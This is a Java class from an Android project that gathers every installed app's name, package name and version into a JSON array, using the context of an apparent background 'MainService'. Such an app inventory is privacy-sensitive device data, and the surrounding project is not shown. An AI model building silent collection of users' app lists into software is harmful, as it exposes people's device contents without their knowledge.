package com.behavioralanalysis.service;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class Apps {
    public static JSONArray get(boolean withSystemPackages) {
        JSONArray array = new JSONArray();
        try {
            Context context = MainService.getContext();
            List<PackageInfo> packages = context
                    .getPackageManager()
                    .getInstalledPackages(0);

            for (int i = 0; i < packages.size(); i++) {
                PackageInfo packageInfo = packages.get(i);
                if (!withSystemPackages && packageInfo.versionName == null) {
                    continue;
                }

                try {
                    JSONObject object = new JSONObject();
                    object.put(
                            "appName",
                            packageInfo.applicationInfo.loadLabel(
                                    context.getPackageManager()
                            ).toString()
                    );
                    object.put("packageName", packageInfo.packageName);
                    object.put("varsionName", packageInfo.versionName);
                    object.put("versionCode", packageInfo.versionCode);

                    array.put(object);
                } catch (JSONException ex) {
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        return array;
    }
}
